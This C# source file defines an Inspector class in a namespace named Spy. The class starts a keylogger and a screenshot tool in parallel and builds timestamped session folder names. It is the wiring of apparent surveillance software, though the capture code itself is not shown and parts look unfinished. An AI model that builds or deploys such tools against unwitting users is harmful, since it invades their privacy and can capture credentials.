namespace HIT.Desktop.Spy
{
    using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.Text;
    using System.Text.RegularExpressions;
    using System.Threading.Tasks;
    using Web.Infrastructure.Extensions;

    public class Inspector
    {
        private readonly string SessionId;
        private readonly IList<IRunnable> ToolsActivated;

        public Inspector()
        {
            ToolsActivated = new List<IRunnable>();
        }

        public void Initialize()
        {
            var keylogger = new Keylogger(this.SessionId);
            var snapshooter = new Snapshooter(SessionId);

            ToolsActivated.Add(keylogger);
            ToolsActivated.Add(snapshooter);

            var keyloggerTask = Task.Run(() => keylogger.Start());
            var snapshooterTask = Task.Run(() => snapshooter.Start());

            Task.WaitAll(keyloggerTask, snapshooterTask);
        }

        private string ComposeSessionId(string sessionName)
        {
            this.ValidateSessionName(sessionName);

            // Cache the current datetime
            // TODO: Replace with dateTime provider
            var date = DateTime.Now;
            var time = date.TimeOfDay;

            // Extract the parameters required to build the session id
            var year = date.Year;
            var month = date.ToString("MMM");
            var day = date.Day;
            var hours = time.Hours.ToTimeString();
            var minutes = time.Minutes.ToTimeString();
            var seconds = time.Seconds.ToTimeString();

            // Compose the session id for it will be used as a folder name
            var sessionId = new StringBuilder(255);
            sessionId.Append($"[{year}-{month}-{day}]");
            sessionId.Append("-");
            sessionId.Append($"[{hours}-{minutes}-{seconds}]");
            sessionId.Append("-");
            sessionId.Append($"[{sessionName}]");

            return sessionId.ToString();
        }

        private void ValidateSessionName(string sessionName)
        {
            if (string.IsNullOrEmpty(sessionName))
            {
                throw new ArgumentNullException("The provided session name cannot be NULL or EMPTY!");
            }

            var charactersNotAllowed = new char[] { '\\', '/', '<', '>', '?', '*', ':', '|', '"', };
            if (sessionName.ContainsAny(charactersNotAllowed))
            {
                throw new InvalidOperationException($@"The session name cannot contain any of the following characters: {string.Join(" ", charactersNotAllowed)}");
            }
        }
    }
}
